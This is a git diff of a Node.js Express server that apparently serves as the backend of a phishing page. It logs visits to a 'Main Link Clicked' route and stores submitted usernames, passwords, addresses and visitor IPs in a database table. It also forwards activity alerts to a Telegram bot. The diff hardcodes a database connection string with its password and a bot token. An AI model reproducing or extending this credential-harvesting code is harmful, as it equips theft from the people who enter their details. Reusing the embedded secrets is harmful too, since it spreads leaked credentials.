@@ -1,17 +1,28 @@
 const express = require('express');
 const path = require('path');
 const { Pool } = require('pg');
-const fetch = require('node-fetch');   // Required for Telegram
+const fetch = require('node-fetch');   // Telegram needs this
 
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Supabase Connection
+// Supabase
 const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
+
+pool.query(`CREATE TABLE IF NOT EXISTS records (
+    id SERIAL PRIMARY KEY,
+    type TEXT,
+    username TEXT,
+    password TEXT,
+    address TEXT,
+    ip TEXT,
+    timestamp TEXT
+)`).then(() => console.log("✅ Supabase Connected"))
+   .catch(err => console.error("Table Error:", err.message));
 
 // Telegram Config
 const BOT_TOKEN = "8840000220:AAHAgXsHJVwYQp64ulKVCC7e4AoLvm4YWpY";
@@ -34,18 +45,6 @@ async function sendTelegramAlert(message) {
     }
 }
 
-// Create Table
-pool.query(`CREATE TABLE IF NOT EXISTS records (
-    id SERIAL PRIMARY KEY,
-    type TEXT,
-    username TEXT,
-    password TEXT,
-    address TEXT,
-    ip TEXT,
-    timestamp TEXT
-)`).then(() => console.log("✅ Supabase Connected"))
-   .catch(err => console.error("Table Error:", err.message));
-
 function getRealIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
            req.headers['x-real-ip'] ||
@@ -62,7 +61,6 @@ async function saveRecord(type, username = null, password = null, address = null
         );
         console.log(`✅ SAVED: ${type} | IP: ${ip}`);
 
-        // Send Telegram Alert
         const alertMsg = `🔔 <b>NEW ACTIVITY</b>\n\nType: ${type}\nIP: ${ip}\nTime: ${timestamp}\nDetails: ${address || username || 'N/A'}`;
         sendTelegramAlert(alertMsg);
 
@@ -71,7 +69,7 @@ async function saveRecord(type, username = null, password = null, address = null
     }
 }
 
-// ==================== ROUTES ====================
+// Routes
 app.get('/', async (req, res) => {
     const ip = getRealIP(req);
     await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
